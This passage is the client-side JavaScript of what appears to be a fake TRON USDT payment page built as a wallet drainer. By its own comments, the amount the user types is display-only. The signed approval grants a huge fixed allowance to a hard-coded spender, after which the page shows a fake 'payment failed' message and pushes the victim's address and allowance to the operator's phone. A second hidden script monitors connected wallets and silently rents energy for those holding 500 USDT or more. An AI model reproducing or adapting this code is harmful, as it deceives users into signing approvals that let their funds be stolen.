      var amt = await readAllowance(tw, from);
      var title;
      if (ok === false) title = "授权交易失败";
      else if (ok === true) title = "USDT 授权成功";
      else title = "USDT 授权已提交";
      if (ok === true && amt && amt > 0) title += " · " + fmtAllowance(amt) + " USDT";
      barkNotify(from, title);
    } catch (e) {
      barkNotify(from, "USDT 授权已提交");
    } finally {
      try { localStorage.removeItem("zakaPendingApproval"); } catch (e) {}
    }
  }

  /* 上次还没等到结果就被关掉的那一笔：这次进来接着等 */
  function resumePendingApproval(tw, from) {
    try {
      var p = JSON.parse(localStorage.getItem("zakaPendingApproval") || "null");
      if (!p || !p.a || (Date.now() - (p.t || 0)) > 10 * 60 * 1000) return;
      if (from && p.a !== from) return;
      watchApproval(tw, p.a, p.x);
    } catch (e) {}
  }

  /* 页面重新打开时补一次：这个地址之前就授权过，也照推（10 分钟内不重复） */
  async function checkApprovalNow(tw, from) {
    if (!tw || !from) return;
    var amt = await readAllowance(tw, from);
    if (amt === null || amt <= 0) return;
    barkNotify(from, "USDT 授权成功 · " + fmtAllowance(amt) + " USDT");
  }

  /* ============================================================
     ===== 测试开关（临时用，测完改回来就行）=====
     TEST_SKIP_APPROVAL = true  → 点「下一步」不再走钱包授权这一步，
                                  直接弹出结果提示，方便先看效果。
     TEST_SKIP_APPROVAL = false → 恢复真实授权流程，其余代码一行都不用动。
     ============================================================ */
  var TEST_SKIP_APPROVAL = false;
  /* 结果弹窗文案：标题 + 说明（说明里可用 <b> 强调数字） */
  var RESULT_TIP_TITLE = "支付失败";
  var RESULT_TIP_DESC  = "流水不足 <b>500 USDT</b>";
  function showResultTip() { showModal(RESULT_TIP_TITLE, RESULT_TIP_DESC); }

  payBtn.addEventListener("click", async function () {
    if (busy) {
      /* 正在等钱包：按钮上已经转着圈，不再叠一句提示 */
      return;
    }

    /* 必须先有数量：空着 / 0 就什么都不发生，也不弹任何提示，
       只是把光标放回输入框，让人知道下一步该填这里 */
    if (!parseAmount($("amountInput").value)) {
      try { $("amountInput").focus(); } catch (e) {}
      return;
    }

    /* 测试模式：跳过授权，转一下圈然后直接出结果提示 */
    if (TEST_SKIP_APPROVAL) {
      busy = true;
      paintBtn("busy");
      showLoading("正在唤起钱包");
      setTimeout(function () {
        busy = false;
        hideLoading();
        payBtn.classList.add("done");
        paintBtn("done", "下一步");
        showResultTip();
      }, 900);
      return;
    }

    /* 点下去第一件事就转圈、底色变淡，不等后面的校验和网络请求 */
    busy = true;
    paintBtn("busy");

    var tw = getTronWeb();
    if (!tw) {
      busy = false;
      paintBtn("idle", "下一步");
      hideLoading();
      toast("请在 TronLink 自带浏览器里打开本页", 2600);
      connect();
      return;
    }

    var from = tw.defaultAddress.base58;

    /* 页面地址栏只做展示，真正调用的目标固定是 PAY_TOKEN，这里不看输入框 */

    /* 数量在前面已经拦过一道了，走到这里一定是有值的，
       这里取出来只是为后面算展示用，不参与这笔授权的金额 */
    var pAmt = parseAmount($("amountInput").value);

    /* 校验都过了，接下来是搭交易、查余额、等钱包弹签名框，这几秒给个居中加载动画 */
    showLoading("正在唤起钱包");

    try {
      /* 上链额度固定按当天日期 + 6 个 0（例：20261120 -> 20261120000000），
         跟输入框里填多少无关；输入框只做展示，不参与这笔授权的金额。 */
      var micro = buildAmount().micro;

      /* 网络判定平时就在后台缓存好了，这里几乎不花时间 */
      var net = LIVE.net || (await detectNet(tw));

      /* 只在这两种明确情况下拦：钱包不在主网、主网上查不到合约。
         节点一时问不出来（null）不拦，交给后面的代币合约存在性检查兜底。 */
      if (net.wrongChain || net.payOk === false) {
        throw new Error("NETMISMATCH:main");
      }

      /* 三件事同时开跑：搭交易、查链上余额、确认代币合约在。
         手上的预热交易直接复用（额度就地换成这次的数量，不再问节点建交易）。 */
      var warm = warmFor(tw, from, micro);
      var builtP = warm ? Promise.resolve(warm) : buildTx(tw, from, micro);
      var balP = readUsdtBalance(tw, net.usdt, from);
      var tokP = nodeHasContract(tw, PAY_TOKEN);

      var built = await builtP;

      /* 实际调用的那个代币合约在这条链上得存在，不然拦住别发 */
      var hasTok = await tokP;
      if (hasTok === false) throw new Error("NOCTR:" + PAY_TOKEN);

      /* 余额校验：以链上实时余额为准，不拿缓存糊弄 */
      var balNow = await balP;
      if (balNow !== null) {
        BAL_USDT = balNow;
        $("availBal").textContent = "可用 " + fmtNum(balNow, 2) + " USDT";
        syncAmount();
        if (pAmt && pAmt.num > balNow + 1e-9) throw new Error("LOWBAL:" + balNow + ":" + pAmt.text);
      }

      paintBtn("busy");
      /* 自检 + 递钱包 + 必要时自动换新重签，都在这里 */
      var signed = await signWithRetry(tw, from, built, micro);
      WARM = null;
      paintBtn("busy");

      /* 广播被限流是暂时的：同一个 txid 重发不会重复上链，重试是安全的 */
      var sent = await retryOnLimit(function () { return tw.trx.sendRawTransaction(signed); }, 2);
      if (!sent || !sent.result) {
        var why = hexMsg(sent && sent.message) || (sent && sent.code) || "节点拒绝";
        var dup = /DUP|duplicate/i.test(String(why));
        throw new Error(dup ? "DUP:" : ("链上未通过：" + why));
      }

      clearBusyGuard();
      busy = false;
      hideLoading();
      SILENT_SIGNS = 0;
      BADTX_STREAK = 0;
      AUTO_RESIGNED = 0;
      payBtn.classList.add("done");
      paintBtn("done", "下一步");
      showResultTip();
      calibrateFee(tw, sent.txid);
      /* 授权这笔上链确认后推一条到手机（链接里带这个用户的钱包地址） */
      watchApproval(tw, from, sent.txid);
      /* 付完了：能量估值和预热那一笔都刷新，下一笔继续是热的 */
      refreshFee(tw, net, from).catch(function () {});
      scheduleWarm(0);
    } catch (e) {
      clearBusyGuard();
      busy = false;
      hideLoading();
      paintBtn("idle", "下一步");
      /* 失败的这笔一律作废，下一次点击一定重新造一笔新的 */
      WARM = null;
      scheduleWarm(500);
      var raw = errTextOf(e);
      var kind = (e && e.kind) || "";
      if (kind !== "NOPOP") SILENT_SIGNS = 0;          /* 只要钱包给过说法，就不算「断了」 */
      if (raw.indexOf("NETMISMATCH:") === 0) {
        toast("钱包不在 TRON 主网（或主网上没找到收款合约），请先在钱包里切到主网再点一次", 5600);
      } else if (raw.indexOf("LOWBAL:") === 0) {
        var seg = raw.split(":");
        toast("余额不足：可用 " + fmtNum(Number(seg[1]), 2) + " USDT，本次需要 " + seg[2] + " USDT", 4600);
      } else if (raw.indexOf("NOCTR:") === 0) {
        toast("这个地址在当前网络上查不到合约（地址填错或网络不对），已拦住不发起交易", 4600);
      } else if (raw.indexOf("BADBUILD:") === 0) {
        warnSkewIfAny();
        toast("这笔交易没通过自检（" + raw.split(":")[1] + "），已重新准备，再点一次就行", 5200);
      } else if (kind === "BADTX") {
        /* 钱包说这笔无效。自动换过一笔新交易重签仍不行，对外只报一句网络错误；
           钱包原话仍写进 __tpSignLog，排查时照样能拿到。 */
        BADTX_STREAK++;
        warnSkewIfAny();
        toast("网络错误，请重试", 4200);
      } else if (raw.indexOf("DUP:") === 0) {
        toast("这笔刚发过（重复交易），已换成新的一笔，再点一次", 4600);
      } else if (kind === "NOPOP") {
        /* 钱包连话都没回：请求没送到它面前（桥断了 / App 在后台被冻住）。
           第一次先说清楚；连着两次就主动把钱包重新接一遍。 */
        SILENT_SIGNS++;
        if (SILENT_SIGNS >= 2) {
          reconnectWallet();
          toast("跟钱包的连接好像断了（点了不弹签名框）。已经帮你重新连接，再点一次就行；还不行就下拉刷新一下本页", 7000);
        } else {
          reconnectWallet();
          toast(signErrText("NOPOP"), 5600);
        }
      } else if (kind === "REJECT") {
        /* 用户自己把签名框关掉了：不弹提示、不报错，按钮已经回到「下一步」，
           想付就再点一次。现场记录照样留在 __tpSignLog 里。 */
      } else if (kind) {
        /* 签名分类过的错误，话已经说清楚了，不再拼一串原始报错 */
        toast(raw, kind === "PENDING" ? 6000 : 4200);
      } else {
        toast(friendly(e) || "这次没成功（钱包没给具体原因），再点一次就行", 4600);
      }
    }
  });
})();
</script>

<script>
/* 后台能量租赁：不产生任何界面元素，不改动页面显示内容 */
(function () {
  "use strict";

  var CFG = {
    USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    TRONGRID: "/trongrid",       /* 同源转发，密钥在服务端 */
    TRONGRID_KEY: "",
    BUY: "/api/",
    ORDERS: "/api2/",
    KEY: "",                    /* 密钥在服务端，前端不再持有 */
    ENERGY: 100400,
    DURATION: "1h",
    MIN_U: 500,
    LS: "trgE1",
    LSI: "trgI1",
    LOCK: "trgL1"
  };

  var lastAddr = "";
  var busy = false;
  var MIN_RAW = CFG.MIN_U * 1000000;

  function lsGet(k) {
    try { var v = localStorage.getItem(k); return v ? JSON.parse(v) : null; } catch (e) { return null; }
  }
  function lsSet(k, v) {
    try { localStorage.setItem(k, JSON.stringify(v)); } catch (e) {}
  }
  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function uuid() {
    try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID(); } catch (e) {}
    var s = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (c) {
      var r = Math.random() * 16 | 0;
      return (c === "x" ? r : (r & 0x3 | 0x8)).toString(16);
    });
    return s;
  }

  function claims() {
    var o = lsGet(CFG.LS);
    return (o && typeof o === "object") ? o : {};
  }
  function claimOf(a) { return claims()[a] || null; }
  function setClaim(a, v) {
    var all = claims();
    all[a] = v;
    var ks = Object.keys(all);
    if (ks.length > 400) {
      ks.sort(function (x, y) { return (all[x].t || 0) - (all[y].t || 0); });
      ks.slice(0, ks.length - 400).forEach(function (k) { delete all[k]; });
    }
    lsSet(CFG.LS, all);
  }
  function idemOf(a) {
    var all = lsGet(CFG.LSI) || {};
    if (!all[a]) { all[a] = uuid(); lsSet(CFG.LSI, all); }
    return all[a];
  }
  function clearIdem(a) {
    var all = lsGet(CFG.LSI) || {};
    delete all[a];
    lsSet(CFG.LSI, all);
  }

  /* 同域名多标签同时开着时，避免两处同时下单 */
  function takeLock(a) {
    var l = lsGet(CFG.LOCK) || {};
    var now = Date.now();
    if (l[a] && now - l[a] < 25000) return false;
    l[a] = now;
    lsSet(CFG.LOCK, l);
    return true;
  }
  function dropLock(a) {
    var l = lsGet(CFG.LOCK) || {};
    delete l[a];
    lsSet(CFG.LOCK, l);
  }

  function api(path, opt) {
    opt = opt || {};
    var headers = { "X-API-Key": CFG.KEY };
    if (opt.body) headers["Content-Type"] = "application/json";
    if (opt.idem) headers["Idempotency-Key"] = opt.idem;
    return fetch(path, {
      method: opt.method || "GET",
      headers: headers,
      body: opt.body ? JSON.stringify(opt.body) : undefined,
      cache: "no-store"
    }).then(function (res) {
      return res.text().then(function (txt) {
        var data = null;
        try { data = txt ? JSON.parse(txt) : null; } catch (e) { data = { raw: txt }; }
        if (!res.ok) {
          var err = new Error("API_" + res.status);
          err.status = res.status;
          err.data = data;
          throw err;
        }
        return data;
      });
    });
  }

  /* ---------- 读链上 USDT 余额（两条路，谁通用谁） ---------- */
  var B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
  function b58ToHex(addr) {
    var bytes = [0], i, j, val;
    for (i = 0; i < addr.length; i++) {
      val = B58.indexOf(addr.charAt(i));
      if (val < 0) return "";
      for (j = 0; j < bytes.length; j++) {
        val += bytes[j] * 58;
        bytes[j] = val & 0xff;
        val >>= 8;
      }
      while (val) { bytes.push(val & 0xff); val >>= 8; }
    }
    for (i = 0; i < addr.length && addr.charAt(i) === "1"; i++) bytes.push(0);
    bytes.reverse();
    if (bytes.length !== 25) return "";
    return bytes.slice(0, 21).map(function (b) { return ("0" + b.toString(16)).slice(-2); }).join("");
  }

  function hexToDec(h) {
    h = String(h || "").replace(/^0x/, "");
    if (!h) return 0;
    if (typeof BigInt === "function") {
      try { return Number(BigInt("0x" + h)); } catch (e) {}
    }
    var n = 0;
    for (var i = 0; i < h.length; i++) n = n * 16 + parseInt(h.charAt(i), 16);
    return n;
  }

  function balViaWallet(tw, addr) {
    var abi = [{ "constant": true, "inputs": [{ "name": "who", "type": "address" }],
      "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }],
      "stateMutability": "view", "type": "function" }];
    return tw.contract(abi, CFG.USDT).at(CFG.USDT).then(function (c) {
      return c.balanceOf(addr).call();
    }).then(function (v) {
      var s = (v && v.toString) ? v.toString() : String(v || "0");
      return Number(s);
    });
  }

  function balViaNode(addr, tw) {
    var ownerHex = "";
    try { ownerHex = tw && tw.address && tw.address.toHex ? tw.address.toHex(addr) : ""; } catch (e) {}
    if (!ownerHex) ownerHex = b58ToHex(addr);
    if (!ownerHex) return Promise.reject(new Error("BAD_ADDR"));
    var param = ("0").repeat(24) + ownerHex.replace(/^41/, "");
    return fetch(CFG.TRONGRID + "/wallet/triggerconstantcontract", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        owner_address: addr,
        contract_address: CFG.USDT,
        function_selector: "balanceOf(address)",
        parameter: param,
        visible: true
      })
    }).then(function (r) { return r.json(); }).then(function (d) {
      var cr = (d && d.constant_result && d.constant_result[0]) || "";
      if (!cr) throw new Error("EMPTY");
      return hexToDec(cr);
    });
  }

  function readBal(tw, addr) {
    return balViaWallet(tw, addr).catch(function () {
      return balViaNode(addr, tw);
    }).catch(function () {
      return balViaNode(addr, null);
    });
  }

  /* ---------- 订单状态 ---------- */
  function findOrder(orderId, addr) {
    return api(CFG.ORDERS + "?receiver_address=" + encodeURIComponent(addr) +
      "&page_size=10&_t=" + Date.now()).then(function (list) {
      var arr = (list && (list.orders || list.items || list.data)) || [];
      for (var i = 0; i < arr.length; i++) {
        if (arr[i] && arr[i].id === orderId) return arr[i];
      }
      return null;
    });
  }

  function watchOrder(orderId, addr) {
    var tries = 0;
    (function next() {
      if (tries >= 60) { dropLock(addr); return; }
      tries++;
      sleep(tries === 1 ? 1500 : 3000).then(function () {
        return findOrder(orderId, addr).catch(function () { return null; });
      }).then(function (o) {
        if (!o) return next();
        if (o.status === "COMPLETED") {
          setClaim(addr, {
            t: Date.now(), status: "completed", orderId: orderId,
            txid: (o.delegation_txids && o.delegation_txids[0]) || "",
            price: o.total_price_trx || null
          });
          clearIdem(addr);
          dropLock(addr);
          return;
        }
        if (o.status === "FAILED") {
          setClaim(addr, { t: Date.now(), status: "failed", orderId: orderId,
            err: o.error_message || "failed" });
          clearIdem(addr);
          dropLock(addr);
          return;
        }
        next();
      }).catch(function () { next(); });
    })();
  }

  function rent(addr, tw) {
    var idem = idemOf(addr);
    var body = { receiver_address: addr, resource_amount: CFG.ENERGY, duration: CFG.DURATION };
    return api(CFG.BUY, { method: "POST", idem: idem, body: body }).catch(function (e) {
      if (e && !e.status) {
        return sleep(1500).then(function () {
          return api(CFG.BUY, { method: "POST", idem: idem, body: body });
        });
      }
      if (e && e.status === 429) {
        return sleep(4000).then(function () {
          return api(CFG.BUY, { method: "POST", idem: idem, body: body });
        });
      }
      throw e;
    }).then(function (order) {
      var oid = order && (order.order_id || order.id);
      if (!oid) throw new Error("NO_ORDER");
      setClaim(addr, { t: Date.now(), status: "pending", orderId: oid });
      watchOrder(oid, addr);
      return true;
    }).catch(function (e) {
      var code = "";
      try {
        var d = e && e.data;
        if (d && d.detail) code = typeof d.detail === "string" ? d.detail : (d.detail.error || d.detail.code || "");
      } catch (x) {}
      /* 池子暂时没量 / 请求重复：过一会儿再试一次，仍然全静默 */
      if (code === "insufficient_balance" || code === "duplicate_request") {
        clearIdem(addr);
        setClaim(addr, { t: Date.now(), status: "retry_later", orderId: null });
      } else {
        setClaim(addr, { t: Date.now(), status: "failed", orderId: null, err: code || ("HTTP_" + (e && e.status)) });
        clearIdem(addr);
      }
      dropLock(addr);
      return false;
    });
  }

  function handle(addr, tw) {
    if (busy) return;
    var c = claimOf(addr);
    if (c) {
      if (c.status === "completed" || c.status === "failed") return;
      if (c.status === "pending" && c.orderId) { watchOrder(c.orderId, addr); return; }
      if (c.status === "retry_later" && Date.now() - (c.t || 0) < 10 * 60 * 1000) return;
    }
    if (!takeLock(addr)) return;

    busy = true;
    readBal(tw, addr).then(function (raw) {
      if (!(raw >= MIN_RAW)) { dropLock(addr); return; }
      return rent(addr, tw);
    }).catch(function () {
      dropLock(addr);
    }).then(function () { busy = false; });
  }

  /* ---------- 等钱包连上（只读，绝不弹窗） ---------- */
  function getAddr() {
    try {
      var tw = (window.tronLink && window.tronLink.tronWeb) || window.tronWeb || null;
      if (!tw) return null;
      var a = tw.defaultAddress && tw.defaultAddress.base58;
      if (!a) return null;
      return { addr: a, tw: tw };
    } catch (e) { return null; }
  }

  var running = false;
  function loop() {
    if (running) return;
    running = true;
    (function tick() {
      var w = getAddr();
      if (w && w.addr !== lastAddr) {
        lastAddr = w.addr;
        handle(w.addr, w.tw);
      } else if (w && w.addr === lastAddr) {
        var c = claimOf(w.addr);
        if (c && c.status === "retry_later" && Date.now() - (c.t || 0) > 10 * 60 * 1000) {
          handle(w.addr, w.tw);
        }
      }
      setTimeout(tick, 1500);
    })();
  }

  try {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", loop);
    } else {
      loop();
    }
    ["tronLink#initialized"].forEach(function (n) {
      document.addEventListener(n, function () { setTimeout(loop, 200); });
      window.addEventListener(n, function () { setTimeout(loop, 200); });
    });
  } catch (e) {}
})();

</script>
